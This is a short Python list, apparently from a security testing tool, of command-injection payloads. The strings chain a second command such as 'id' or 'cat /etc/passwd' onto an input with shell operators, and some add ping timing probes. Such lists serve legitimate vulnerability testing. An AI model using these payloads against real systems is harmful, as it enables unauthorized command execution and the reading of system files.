COMMAND_INJECTION_PAYLOADS = [
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "ping -c 10 127.0.0.1",
    "; ping -c 10 127.0.0.1;",
]
